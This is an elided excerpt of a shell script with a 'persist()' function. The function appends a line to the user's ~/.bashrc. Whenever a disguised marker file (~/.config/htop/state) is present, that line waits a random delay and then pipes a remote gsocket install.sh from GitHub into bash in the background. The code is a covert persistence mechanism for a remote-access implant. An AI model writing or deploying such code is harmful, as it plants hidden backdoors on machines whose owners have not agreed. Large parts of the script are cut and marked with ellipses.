...
CONFIG_URL="https://yourdomain.com/gsock-config.txt"
...
persist() {
    ...
    # Bashrc persistence
    echo '[ -f ~/.config/htop/state ] && (sleep $((RANDOM%60)); curl -fsSL https://raw.githubusercontent.com/tobrutt/gsocket/refs/heads/main/install.sh | bash) &' >> ~/.bashrc
}
